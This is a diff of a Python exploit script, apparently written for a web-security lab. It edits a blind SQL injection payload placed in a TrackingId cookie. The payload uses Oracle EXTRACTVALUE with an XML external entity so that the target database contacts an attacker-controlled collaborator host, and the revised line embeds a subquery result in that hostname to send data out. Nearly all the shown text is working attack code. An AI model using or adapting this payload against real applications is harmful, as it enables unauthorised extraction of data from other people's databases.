@@ -1,13 +1,3 @@
-"""
-in process
-
-
-
-
--
-
-"""
-
 import sys
 import logging
 import urllib3
@@ -41,10 +31,10 @@ def main(args):
     session_token = resp.cookies["session"]
     log.info(f"TrackingId: {tracking_id}")
     exploit = (
-          f"{tracking_id}'+UNION SELECT EXTRACTVALUE(xmltype('"
+          f"{tracking_id}'+(SELECT EXTRACTVALUE(xmltype('"
           '<?xml version="1.0" encoding="UTF-8"?>'
-          "<!DOCTYPE root [ <!ENTITY % remote SYSTEM" 
-          f"\"http://{args.collab}/\">"
+          "<!DOCTYPE root [ <!ENTITY % remote SYSTEM " 
+          f"\"http://'||(select 'abcd' from dual)||'.{args.collab}/\">"
           " %remote;]>'),'/l') FROM dual-- "
 )   
     
